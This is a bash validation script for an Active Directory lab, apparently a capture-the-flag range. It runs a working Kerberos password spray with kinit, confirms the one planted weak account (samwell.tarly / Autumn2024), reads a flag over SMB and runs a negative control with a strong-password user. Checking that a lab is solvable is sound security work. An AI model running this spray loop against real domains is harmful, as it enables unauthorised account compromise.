#!/bin/bash
# Proves the password-spraying path end to end, as a student would, driven from inside the DC:
#   1. spray every candidate password in the wordlist across the whole user roster (Kerberos
#      AS-REQ, exactly what kerbrute/nxc do) and collect every (user, password) that authenticates,
#   2. confirm there is exactly one hit and it is the planted weak seasonal account
#      (samwell.tarly / Autumn2024) -- which proves the strong-password users resist the spray,
#   3. use that one recovered credential to read the flag from the share only it may open, and
#      confirm the flag matches the one the DC planted,
#   4. negative control: a different, legitimately authenticating user (jon.snow, strong password)
#      must NOT be able to read the share -- the flag is gated behind samwell.tarly, not just any login.
# Exits 0 (and prints PWSPRAY_OK) only when every step holds, i.e. only when the domain is genuinely
# sprayable: lockout disabled, one account reusing a weak seasonal password, flag gated behind it.
set -uo pipefail

REALM="NORTH.SEVENKINGDOMS.LOCAL"
USERS="/opt/pwspray/users.txt"
WORDLIST="/opt/pwspray/wordlist.txt"
SHARE="nightswatch"

EXPECT_USER="samwell.tarly"
EXPECT_PASS="Autumn2024"
PLANTED="/srv/nightswatch/flag.txt"

# A user with a strong, random password: must authenticate fine (valid domain user) yet be denied
# the flag share. Used as the share-ACL negative control.
STRONG_USER="jon.snow"
STRONG_PASS="Nk3gRq7xWm8Y=d"

WORK="$(mktemp -d)"
export KRB5CCNAME="${WORK}/spray.ccache"
trap 'kdestroy -A >/dev/null 2>&1 || true; rm -rf "${WORK}"' EXIT

fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

echo "[1/4] spraying $(grep -c . "${WORDLIST}") candidate passwords across $(grep -c . "${USERS}") users (Kerberos AS-REQ) ..." >&2
hits=()
while IFS= read -r candidate || [ -n "${candidate}" ]; do
  [ -n "${candidate}" ] || continue
  while IFS= read -r user || [ -n "${user}" ]; do
    [ -n "${user}" ] || continue
    kdestroy -A >/dev/null 2>&1 || true
    if printf '%s' "${candidate}" | kinit "${user}@${REALM}" >/dev/null 2>&1; then
      hits+=("${user}:${candidate}")
      echo "      [+] ${user}:${candidate}" >&2
    fi
  done < "${USERS}"
done < "${WORDLIST}"

[ "${#hits[@]}" -eq 1 ] || fail "spray produced ${#hits[@]} hits (expected exactly 1): ${hits[*]:-none}"
[ "${hits[0]}" = "${EXPECT_USER}:${EXPECT_PASS}" ] \
  || fail "the single spray hit was '${hits[0]}', expected '${EXPECT_USER}:${EXPECT_PASS}'"

echo "[2/4] confirmed single sprayable account: ${EXPECT_USER} / ${EXPECT_PASS}" >&2

echo "[3/4] reading the ${SHARE} share as ${EXPECT_USER} with the recovered password ..." >&2
OUT="${WORK}/flag.out"
smbclient "//dc/${SHARE}" -U "NORTH\\${EXPECT_USER}%${EXPECT_PASS}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the ${SHARE} share as ${EXPECT_USER}"
[ -s "${OUT}" ] || fail "${SHARE} flag.txt came back empty"
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${EXPECT_USER} does not match the planted flag"

echo "[4/4] negative control: ${STRONG_USER} (valid login) must be denied the ${SHARE} share ..." >&2
if smbclient "//dc/${SHARE}" -U "NORTH\\${STRONG_USER}%${STRONG_PASS}" \
     -c "get flag.txt ${WORK}/strong.out" >/dev/null 2>&1 && [ -s "${WORK}/strong.out" ]; then
  fail "${SHARE} is readable by ${STRONG_USER}; the flag is not gated behind ${EXPECT_USER}"
fi

echo "CHECK PASS: spray -> ${EXPECT_USER}:${EXPECT_PASS} -> ${SHARE} -> flag $(cat "${OUT}")" >&2
echo "PWSPRAY_OK"
